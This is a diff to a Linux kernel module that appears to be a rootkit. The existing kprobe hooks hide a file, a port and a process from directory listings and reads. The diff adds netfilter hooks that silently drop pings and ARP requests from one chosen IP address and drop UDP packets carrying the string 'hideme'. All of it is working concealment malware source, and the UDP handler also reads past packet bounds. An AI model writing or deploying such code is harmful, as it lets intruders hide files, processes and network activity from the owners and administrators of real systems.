@@ -13,10 +13,20 @@
 #include <linux/mm_types.h>
 #include <linux/sched/signal.h>
 
+#include <linux/netfilter.h>
+#include <linux/netfilter_arp.h>
+#include <uapi/linux/netfilter_ipv4.h>
+#include <linux/ip.h>
+#include <linux/if_ether.h>
+#include <linux/icmp.h>
+#include <linux/udp.h>
+#include <linux/if_arp.h>
+
 /// const file name to hide
 const char* hide_file_name = "hideme";
 const int port_to_hide = 8000;
 const char* pid_to_hide = "/proc/3910";
+const char selected_ip[4] = {192, 168, 1, 208};
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -168,7 +178,6 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
                     new_length += row_length;
                 }
             }
-
             row_start += row_length;
         }
         
@@ -219,6 +228,120 @@ static int newfstatat_handle_return(struct kretprobe_instance *ri, struct pt_reg
 }
 
 
+static unsigned int netfilter_ip_hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+{
+    // struct ethhdr *eth = eth_hdr(skb);
+    struct iphdr *ip = ip_hdr(skb);
+
+    // printk("caller: %s\n", current->comm);
+    // printk("mac: %pM\n", eth->h_source);
+    // printk("ip protocol: %d\n", ip->protocol);
+    // printk("ip protocol: %d\n", ip->protocol);
+    // printk("%pI4 -> %pI4\n", &ip->saddr, &ip->daddr);
+
+    unsigned long ip_source = ip->saddr;
+    unsigned long my_ip = 0;
+    memcpy(&my_ip, selected_ip, 4);
+
+    switch (ip->protocol)
+    {
+    case IPPROTO_ICMP:
+    {
+        if (ip_source == my_ip)
+        {
+            struct icmphdr *icmp = icmp_hdr(skb);
+
+            // ping
+            if (icmp->type == ICMP_ECHO)
+            {
+                pr_info("Found Ping %lX %lX\n", ip_source, my_ip);
+                return NF_DROP;
+            }
+        }
+        break;
+    }
+    case IPPROTO_UDP:
+    {
+        struct udphdr *udp = udp_hdr(skb);
+        void *payload = ((char *)udp) + sizeof(struct udphdr);
+
+        char *message = payload;
+        if (memchr(message, '\0', 1024) != NULL)
+        {
+            if (strcmp(message, "hideme") == 0)
+            {
+                pr_info("HIDING UDP message: %s\n", message);
+                return NF_DROP;
+            }
+        }
+        else
+        {
+            pr_info("UDP message is nbt string\n");
+        }
+
+        break;
+    }
+    }
+
+    return NF_ACCEPT;
+}
+
+struct arp_ip_request {
+    unsigned char sender_ha_addr[ETH_ALEN];
+    unsigned char sender_ip_addr[4];
+    
+    unsigned char target_ha_addr[ETH_ALEN];
+    unsigned char target_ip_addr[4];
+};
+
+static unsigned int netfilter_arp_hook_func(void * priv, struct sk_buff * skb, const struct nf_hook_state * state){
+    struct arphdr * arp = arp_hdr(skb);
+    struct arp_ip_request  arp_request;
+    unsigned short op = ntohs(arp->ar_op);
+
+    // only ARP IP request
+    if(op != ARPOP_REQUEST || ntohs(arp->ar_pro) != ETH_P_IP){
+        return NF_ACCEPT;
+    }
+
+    // copy to buffer
+    if(skb_copy_bits(skb, sizeof(struct arphdr), (void*)&arp_request, sizeof(struct arp_ip_request)) < 0){
+        pr_warn("Cannot copy from packet\n");
+        return NF_ACCEPT;
+    }
+
+    // pr_info("ARP from %pI4 Searching %pI4\n", arp_request.sender_ip_addr, arp_request.target_ip_addr);
+
+    unsigned long my_ip = 0;
+    memcpy(&my_ip, selected_ip, 4);
+    unsigned long sender_ip = 0;
+    memcpy(&sender_ip, arp_request.sender_ip_addr, 4);
+
+    if(sender_ip == my_ip){
+        pr_info("DROPING ARP from %pI4 Searching %pI4\n", arp_request.sender_ip_addr, arp_request.target_ip_addr);
+        return NF_DROP;
+    }
+
+    return NF_ACCEPT;
+}
+
+
+
+static struct nf_hook_ops net_hooks[2] = {
+    {
+        .hook = netfilter_ip_hook_func,
+        .hooknum = NF_INET_PRE_ROUTING,
+        .pf = NFPROTO_INET,
+        .priority= NF_IP_PRI_FIRST
+    },
+    {
+        .hook = netfilter_arp_hook_func,
+        .hooknum = NF_INET_PRE_ROUTING,
+        .pf = NFPROTO_ARP,
+        .priority= NF_IP_PRI_FIRST
+    }
+};
+
 
 static struct kretprobe getdents64_kret_probe = {
         .maxactive = 20,
@@ -248,9 +371,16 @@ static struct kretprobe newfstatat_kret_probe = {
 static int __init entrypoint(void)
 {
     if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0 || register_kretprobe(&newfstatat_kret_probe) < 0) {
-        pr_info("register_kretprobe  failed\n");
+        pr_info("register_kretprobe failed\n");
         return -1;
     }
+
+    if(nf_register_net_hooks(&init_net, net_hooks, 2) < 0){
+        pr_info("nf_register_net_hook failed\n");
+        return -1;
+    }
+
+
     pr_info("kretprobe registered\n");
     return 0;
 }
@@ -269,6 +399,7 @@ static void __exit cleanup(void){
     unregister_kretprobe(&getdents64_kret_probe);
     unregister_kretprobe(&read_kret_probe);
     unregister_kretprobe(&newfstatat_kret_probe);
+    nf_unregister_net_hooks(&init_net, net_hooks, 2);
 
     pr_info("Yarin Module cleanup\n");
 }
